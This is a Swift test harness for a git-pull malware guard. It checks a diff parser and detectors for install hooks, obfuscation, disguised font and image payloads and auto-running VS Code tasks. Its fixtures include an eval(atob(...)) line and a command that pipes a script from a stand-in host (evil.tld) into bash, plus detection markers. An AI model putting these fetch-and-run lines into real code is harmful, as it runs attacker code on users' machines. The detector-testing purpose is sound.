//
//  test-gitguard-logic.swift
//  Dev-only test harness (not shipped) — exercises GitCommandMatcher,
//  MaliciousCodeHeuristics, and GitDiffScanner's parser directly, no root/
//  su/real git process needed. Run via:
//    swift Sources/mabured/GitCommandMatcher.swift Sources/mabured/GitDiffScanner.swift \
//          Sources/mabured/MaliciousCodeHeuristics.swift Tools/test-gitguard-logic.swift
//

import Foundation

var failures = 0
func check(_ name: String, _ cond: @autoclosure () -> Bool) {
    if cond() { print("  ok   \(name)") } else { print("  FAIL \(name)"); failures += 1 }
}

print("== GitCommandMatcher ==")
do {
    let m1 = GitCommandMatcher.classify(argv: ["git", "pull"])
    check("plain pull", m1.subcommand == "pull")

    let m2 = GitCommandMatcher.classify(argv: ["git", "-C", "/tmp/repo", "pull", "--rebase"])
    check("-C repo pull --rebase", m2.subcommand == "pull" && m2.dashCPath == "/tmp/repo")

    let m3 = GitCommandMatcher.classify(argv: ["git", "fetch", "origin"])
    check("fetch recognized (not tracked by GitProcessTracker in v1)", m3.subcommand == "fetch")

    let m4 = GitCommandMatcher.classify(argv: ["git", "--version"])
    check("--version has no subcommand", m4.subcommand == nil)

    let m5 = GitCommandMatcher.classify(argv: ["git", "-c", "http.sslVerify=false", "merge", "origin/main"])
    check("-c KEY=VAL then merge", m5.subcommand == "merge")

    let m6 = GitCommandMatcher.classify(argv: ["git", "--git-dir=/tmp/repo/.git", "pull"])
    check("--git-dir=path glued form", m6.subcommand == "pull")

    let m7 = GitCommandMatcher.classify(argv: ["git", "log", "--oneline"])
    check("unrelated subcommand (log) not pull/merge", m7.subcommand == "log")
}

print("== GitDiffScanner diff-header parsing (via a crafted unified diff) ==")
do {
    let sampleDiff = """
    diff --git a/package.json b/package.json
    index 1111111..2222222 100644
    --- a/package.json
    +++ b/package.json
    @@ -1,5 +1,8 @@
     {
       "name": "victim-pkg",
    +  "scripts": {
    +    "postinstall": "node ./setup.js"
    +  },
       "version": "1.0.0"
     }
    diff --git a/setup.js b/setup.js
    new file mode 100644
    index 0000000..3333333
    --- /dev/null
    +++ b/setup.js
    +eval(atob("ZnVuY3Rpb24gbWFsaWNpb3VzKCl7fQ=="));
    +require('child_process').exec('curl -s https://evil.tld/x.sh | bash');
    diff --git a/README.md b/README.md
    index 4444444..5555555 100644
    --- a/README.md
    +++ b/README.md
    @@ -1 +1,2 @@
     # victim-pkg
    +Just a normal doc update, nothing to see here.
    """

    // GitDiffScanner.parse is internal (not private), so this calls the
    // real implementation directly — no risk of a duplicated copy drifting
    // from the real logic.
    let files = GitDiffScanner.parse(sampleDiff)
    check("parsed 3 files", files.count == 3)
    check("package.json identified", files[0].pathB == "package.json")
    check("setup.js is new file", files[1].isNewFile)
    check("setup.js added-lines contains eval(atob(", files[1].addedLinesText.contains("eval(atob("))

    print("== MaliciousCodeHeuristics ==")
    let pkgRules = MaliciousCodeHeuristics.evaluate(files[0], maxScanBytes: 1_000_000)
    check("package.json flags manifest_lifecycle_script_change",
          pkgRules.contains { $0.name == "manifest_lifecycle_script_change" })

    let setupRules = MaliciousCodeHeuristics.evaluate(files[1], maxScanBytes: 1_000_000)
    check("setup.js flags eval_dynamic_string", setupRules.contains { $0.name == "eval_dynamic_string" })
    check("setup.js flags pipe_to_shell", setupRules.contains { $0.name == "pipe_to_shell" })
    let sev3 = setupRules.filter { $0.severity >= 3 }
    check("setup.js has at least one severity-3 match (would trigger revert)", !sev3.isEmpty)

    let readmeRules = MaliciousCodeHeuristics.evaluate(files[2], maxScanBytes: 1_000_000)
    check("README.md (benign) flags nothing", readmeRules.isEmpty)

    // Negative cases: things that must NOT fire.
    let benignJS = GitDiffFile(pathA: "app.js", pathB: "app.js", isNewFile: false, isBinary: false,
                                addedLinesText: "function add(a,b) { return a + b; }\nconsole.log('hello world');",
                                byteSize: 60)
    check("ordinary JS diff flags nothing", MaliciousCodeHeuristics.evaluate(benignJS, maxScanBytes: 1_000_000).isEmpty)

    let lockfile = GitDiffFile(pathA: "package-lock.json", pathB: "package-lock.json", isNewFile: false, isBinary: false,
                                addedLinesText: String(repeating: "a1b2c3d4e5f6", count: 20),
                                byteSize: 240)
    check("lockfile high-entropy content excluded (low-signal path)",
          MaliciousCodeHeuristics.evaluate(lockfile, maxScanBytes: 1_000_000).isEmpty)

    let ciFile = GitDiffFile(pathA: ".github/workflows/ci.yml", pathB: ".github/workflows/ci.yml",
                              isNewFile: false, isBinary: false, addedLinesText: "run: echo hi", byteSize: 12)
    check("CI workflow file change flags ci_or_hook_file_change",
          MaliciousCodeHeuristics.evaluate(ciFile, maxScanBytes: 1_000_000).contains { $0.name == "ci_or_hook_file_change" })
}

print("== PolinRiderMarkers ==")
do {
    func fileWith(_ text: String, path: String = "x.js") -> GitDiffFile {
        GitDiffFile(pathA: path, pathB: path, isNewFile: true, isBinary: false,
                    addedLinesText: text, byteSize: text.utf8.count)
    }

    check("packed string v1 fires", PolinRiderMarkers.evaluate(fileWith("var x = 'rmcej%otb%';")).contains { $0.name == "polinrider_packed_string_v1" })
    check("packed string v2 fires", PolinRiderMarkers.evaluate(fileWith("var x = 'Cot%3t=shtP';")).contains { $0.name == "polinrider_packed_string_v2" })
    check("global['!']= fires", PolinRiderMarkers.evaluate(fileWith("global['!']=1;")).contains { $0.name == "polinrider_global_bang_key" })
    check("global[\"_V\"]= fires", PolinRiderMarkers.evaluate(fileWith("global[\"_V\"] = '8-abc';")).contains { $0.name == "polinrider_global_v_key" })
    check("global['r']=require fires (severity 2)",
          PolinRiderMarkers.evaluate(fileWith("global['r']=require;")).contains { $0.name == "polinrider_global_require_module_stash" && $0.severity == 2 })
    check("bink@DESKTOP artifact fires", PolinRiderMarkers.evaluate(fileWith("// bink@DESKTOP-N8JGD6T")).contains { $0.name == "polinrider_ssh_key_artifact" })
    check("com.bablu.helper.plist artifact fires", PolinRiderMarkers.evaluate(fileWith("com.bablu.helper.plist")).contains { $0.name == "polinrider_macos_launchagent_artifact" })
    check("_0x hex identifier shape fires (severity 2)",
          PolinRiderMarkers.evaluate(fileWith("var _0x4f2a = 1;")).contains { $0.name == "obfuscator_hex_suffixed_identifier" && $0.severity == 2 })
    check("_$_ hex identifier shape fires", PolinRiderMarkers.evaluate(fileWith("function _$_1e42(){}")).contains { $0.name == "obfuscator_hex_suffixed_identifier" })
    check("ordinary JS flags nothing from PolinRiderMarkers",
          PolinRiderMarkers.evaluate(fileWith("function add(a,b){return a+b;}")).isEmpty)
}

print("== BinaryMasqueradeScanner (pure content-check portion, no git/su needed) ==")
do {
    check("fake woff2 containing require( is flagged",
          BinaryMasqueradeScanner.suspiciousContentRule(in: "\u{0}\u{0}\u{1}\u{0}require('child_process').exec('x')", filePath: "font.woff2", ext: "woff2") != nil)
    check("real-looking binary header alone is NOT flagged",
          BinaryMasqueradeScanner.suspiciousContentRule(in: "wOF2\u{0}\u{1}\u{0}\u{0}\u{0}binarydatabinarydata", filePath: "font.woff2", ext: "woff2") == nil)
    check("fake png containing atob( is flagged",
          BinaryMasqueradeScanner.suspiciousContentRule(in: "\u{89}PNG\u{0}\u{0}atob('ZXZpbA==')", filePath: "logo.png", ext: "png") != nil)
}

print("== VSCodeTaskMarkers ==")
do {
    func taskFile(_ text: String, path: String = ".vscode/tasks.json") -> GitDiffFile {
        GitDiffFile(pathA: path, pathB: path, isNewFile: true, isBinary: false,
                    addedLinesText: text, byteSize: text.utf8.count)
    }

    check("runOn folderOpen fires", VSCodeTaskMarkers.evaluate(taskFile(#""runOptions": { "runOn": "folderOpen" }"#))
        .contains { $0.name == "vscode_task_autorun_on_folder_open" })
    check("allowAutomaticTasks:on fires (in settings.json)",
          VSCodeTaskMarkers.evaluate(taskFile(#""task.allowAutomaticTasks": "on""#, path: ".vscode/settings.json"))
            .contains { $0.name == "vscode_task_allow_automatic_tasks_enabled" })
    check("node on .woff2 fires",
          VSCodeTaskMarkers.evaluate(taskFile(#""command": "node", "args": ["./assets/fonts/icon.woff2"]"#))
            .contains { $0.name == "vscode_task_node_on_nonjs_asset" })
    check("known C2 domain fires (severity 2)",
          VSCodeTaskMarkers.evaluate(taskFile(#""url": "https://api.trongrid.io/foo""#))
            .contains { $0.name == "vscode_task_known_c2_domain" && $0.severity == 2 })
    check("ordinary tasks.json (build task) flags nothing",
          VSCodeTaskMarkers.evaluate(taskFile(#"{"label":"build","type":"shell","command":"npm run build"}"#)).isEmpty)
    check("same suspicious content OUTSIDE .vscode/ is not evaluated (path-gated)",
          VSCodeTaskMarkers.evaluate(taskFile(#""runOn": "folderOpen""#, path: "src/config.json")).isEmpty)
    check(".code-workspace file is also covered",
          VSCodeTaskMarkers.evaluate(taskFile(#""runOn": "folderOpen""#, path: "myproject.code-workspace"))
            .contains { $0.name == "vscode_task_autorun_on_folder_open" })
}

print(failures == 0 ? "\nALL PASSED" : "\n\(failures) FAILURE(S)")
exit(failures == 0 ? 0 : 1)
